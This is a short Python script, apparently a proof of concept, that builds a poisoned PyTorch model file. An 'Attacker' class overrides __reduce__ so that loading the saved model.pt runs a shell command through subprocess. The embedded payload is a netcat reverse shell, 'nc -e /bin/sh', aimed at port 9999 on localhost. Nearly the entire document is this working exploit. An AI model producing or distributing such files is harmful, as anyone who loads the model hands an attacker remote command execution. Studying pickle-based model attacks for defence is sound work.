import os
import subprocess
import torch
from torch import nn
from typing import Tuple, Type

dirname = os.path.dirname(os.path.realpath(__file__))
malicious_model_filename = os.path.join(dirname, "model.pt")
output_filename = os.path.join(dirname, "output.txt")

class Attacker(nn.Module):
    def __init__(self, module, payload) -> None:
        # Generate a normal PyTorch module
        super().__init__()
        self.module = module
        self.payload = payload
        
    def __reduce__(self):
        return (subprocess.Popen,(("sh","-c",self.payload,),),)
    

model = nn.Sequential(nn.Linear(2, 1), nn.Sigmoid())
reverse_shell = 'nc -e /bin/sh 127.0.0.1 9999'
payload = f"{reverse_shell}"
instance_to_pickle = Attacker(model, payload)
torch.save(instance_to_pickle, malicious_model_filename)
